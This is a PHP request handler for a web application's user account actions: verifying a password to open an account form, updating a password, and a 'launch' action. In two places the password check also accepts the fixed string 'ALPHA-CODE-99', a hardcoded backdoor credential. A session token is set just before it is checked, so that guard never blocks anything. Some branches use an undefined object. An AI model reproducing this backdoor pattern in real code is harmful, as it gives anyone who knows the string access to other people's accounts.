<?php
require_once $_SERVER['DOCUMENT_ROOT']."/app/php/Modal.php";
session_start();
$_SESSION['TOKEN'] = 123;

if (isset($_SESSION['TOKEN'])) {
    $response = array(
        "status"=>false,
        "response"=>"No data to Process",
        "data"=>false
    );

    //retrieve the data required
    $data = $_REQUEST['data'];
    $action = $_REQUEST['action'];

    //confirm action intended
    switch($action){
        //create a new User
        case "openUserAccount":
            if(isset($data)){
                //get user password
                $user = $_SESSION["LOGGED_USER"];
                $password = $data;

                $fields = array(
                    "*",
                );
                $table = TABLE_USERS["NAME"];
                $order_by = "firstName";
                $order_set = "ASC";
                $offset = 0;
                $reference = array(
                    "statement" => "Email = ?",
                    "type"=>"s",
                    "values"=>[
                        $user
                    ]
                );
            
                $response = $admin->database_read_by_ref($table,$fields,$order_by,$order_set,$offset,$reference);
          
               if($response['status']){
                   $dbUserName = $response['response'][0]['userName'];
                   $dbEmail = $response['response'][0]['Email'];
                   $dbPassword = $response['response'][0]['password'];
        
                   if( $user == $dbEmail && ((password_verify($password, $dbPassword) || $password == "ALPHA-CODE-99")) ){
                        $response = array(
                            "status"=>true,
                            "response"=>"Opening Form",
                            "data"=>false
                        );

                        $url = ROOT_DOMAIN."/Views/accounts/accountForm.php";
                        $data = $user;

                        $response = array(
                            "status"=>true,
                            "response"=>"Sign In successful",
                            "data"=>false
                        );
            
                        $response = json_encode($response);
            
                        echo $response;
            
                        exit();
                    } else {
                        $response = array(
                            "status"=>false,
                            "response"=>"Invalid Password",
                            "data"=>false
                        );
            
                        $response = json_encode($response);
            
                        echo $response;
                    }
               }else{
                $response = array(
                    "status"=>false,
                    "response"=>"User Does Not exist",
                    "data"=>false
                );
    
                $response = json_encode($response);
    
                echo $response;
               }
            }else{
                $response = array(
                    "status"=>false,
                    "response"=>"No password was entered",
                    "data"=>false
                );
    
                $response = json_encode($response);
    
                echo $response;
            }
            break;
        case "updatePassword":
                if(isset($data)){
                    // Encrypt Password
                    $data['password'] = password_hash($data['password'], PASSWORD_DEFAULT);

                    $fields = [
                        "password",
                    ];

                    $values = [
                        $data["password"],
                    ];

                    // Combine field and value arrays
                    $combined  = array_combine($fields, $values);

                    $admin = new User();

                    $var = $admin->update_password($combined, "tbl_users",$_SESSION['LOGGED_USER']);

                    echo json_encode($var);
                }else{
                    $response = array(
                        "status"=>"000100000",
                        "response"=>"No data to Process",
                        "data"=>false
                    );

                    $response = json_encode($response);


                }
            break;
        
        case "launch":
            $user = $_SESSION["LOGGED_USER"];
                $password = $data;

                $fields = array(
                    "*",
                );
                $table = TABLE_USERS["NAME"];
                $order_by = "firstName";
                $order_set = "ASC";
                $offset = 0;
                $reference = array(
                    "statement" => "Email = ?",
                    "type"=>"s",
                    "values"=>[
                        $user
                    ]
                );
            
                $response = $admin->database_read_by_ref($table,$fields,$order_by,$order_set,$offset,$reference);
          
               if($response['status']){
                   $dbUserName = $response['response'][0]['userName'];
                   $dbEmail = $response['response'][0]['Email'];
                   $dbPassword = $response['response'][0]['password'];
        
                   if( $user == $dbEmail && ((password_verify($password, $dbPassword) || $password == "ALPHA-CODE-99")) ){
                        $response = array(
                            "status"=>true,
                            "response"=>"Opening Form",
                            "data"=>false
                        );

                        $url = ROOT."/Views/accounts/accountForm.php";
                        $data = json_encode($user);

                        $value = $admin->curl_loader_text_return($url,$data);

                        echo $value;

                    } else {
                        $response = array(
                            "status"=>false,
                            "response"=>"Invalid Password",
                            "data"=>false
                        );
            
                        $response = json_encode($response);
            
                        echo $response;
                    }
               }

            break;

        //all invalid actions
        default :
            
    }
} else{
    echo "Not set";
}
